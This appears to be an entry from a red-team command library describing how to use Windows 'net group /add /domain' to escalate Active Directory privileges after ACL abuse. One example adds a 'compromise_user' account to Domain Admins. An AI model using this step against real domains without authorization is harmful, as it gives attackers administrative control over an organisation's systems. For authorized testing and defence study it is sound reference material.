---
id: 4de71573-1ffb-438f-a0b2-7dd18bfe1860
name: add-user1-to-interesting-group-via-net
type: command
executor: cmd
data: net group "$_GROUP_NAME" "$_USER_NAME" /add /domain
output: null
created_at: '2023-04-06T03:56:06.850541+00:00'
updated_at: '2023-04-10T20:36:10.633986+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - group-management
verified: true
validated: true
---

# add-user1-to-interesting-group-via-net

## Command

```cmd
net group "$_GROUP_NAME" "$_USER_NAME" /add /domain
```

## Description

This native Windows command adds a user to a domain group, requiring WriteMembers permission on the group. Use after granting ACLs to escalate access via group membership.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_GROUP_NAME | The name of the target domain group (e.g., INTERESTING_GROUP) | Yes |
| $_USER_NAME | The username to add (e.g., User1) | Yes |
| /add | Flag to add the user to the group | Yes |
| /domain | Specifies domain context for the group | Yes |

## Examples

### Basic Usage

```cmd
net group "INTERESTING_GROUP" "User1" /add /domain
```

### Advanced Usage

```cmd
net group "Domain Admins" "compromise_user" /add /domain
```

## Expected Output

The command completed successfully.

If the user is already a member or permissions are insufficient: The user name could not be found or Access is denied.

## Related

- [[procedures/Abuse-WriteDACL-to-Grant-Group-Membership-Permissions]]
- [[commands/add-writemembers-acl-to-interesting-group-for-user1]]
